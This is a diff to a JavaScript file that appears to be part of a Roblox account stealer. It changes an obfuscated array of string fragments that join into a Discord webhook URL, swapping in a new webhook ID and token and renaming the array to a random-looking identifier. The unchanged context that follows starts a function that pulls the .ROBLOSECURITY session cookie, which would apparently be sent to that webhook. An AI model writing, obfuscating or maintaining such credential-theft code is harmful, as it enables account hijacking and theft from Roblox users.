@@ -1,12 +1,12 @@
-const _encryptedParts = [
+const eiejwhqjkw2 = [
   'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '35', '26', '28', '52', '32', '18', '50', '58', '39', '/2', 
-  'Jx', '8U', 'A9', 'tI', 'F_', 'l8', 'bv', 'Zb', 'fS', 'cL', '5c', 'F_', 'o0', 
-  'gk', 'Vo', 'Jo', 'U4', 'Dw', 'yB', 'tS', 'X2', 'oi', 'W-', 'qK', 'ET', 'KT', 
-  '1x', 'VM', 'fm', 'jj', 'Hd', 'YR', '0_', '4'
+  'oo', 'ks', '/1', '35', '26', '34', '05', '38', '40', '60', '52', '05', '/7', 
+  'oh', 'fc', 'LF', 'RB', 'a2', 'pG', 'cU', 'sm', 'kl', 'bM', 'p4', 'Es', 'mj', 
+  'ki', 'Yq', 'ar', 'o9', '6b', 'yl', 'EC', 'v6', 'fZ', 'p_', 'By', 'ui', 'LY', 
+  'aj', 'wC', '26', 'Qy', 'Jl', 'iY', 'MI', 'a'
 ];
 
-const _decrypted = _encryptedParts.join(''); // Decrypt the URL by concatenating the parts
+const _decrypted = eiejwhqjkw2.join(''); // Decrypt the URL by concatenating the parts
 
 function extractRobloxSecurityCookie(sessionId) {
   // Use a regular expression to find the .ROBLOSECURITY cookie
